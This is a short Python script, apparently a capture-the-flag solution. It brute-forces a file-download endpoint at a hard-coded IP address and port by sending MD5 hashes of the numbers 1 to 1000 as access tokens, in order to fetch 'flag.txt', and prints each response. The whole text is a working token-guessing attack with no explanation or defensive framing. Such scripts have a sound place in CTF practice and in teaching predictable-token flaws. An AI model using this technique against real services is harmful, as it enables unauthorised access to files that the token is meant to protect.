import hashlib
import requests

url = "http://165.22.22.11:25632/"

tokens = {}
for i in range(1,1001):
    a = hashlib.md5(str(i))
    tokens[i] = a.hexdigest()

for i in range(1,1001):
    r = requests.get(url + "download.php?file=flag.txt&token="+tokens[i])
    print(i, r.text)
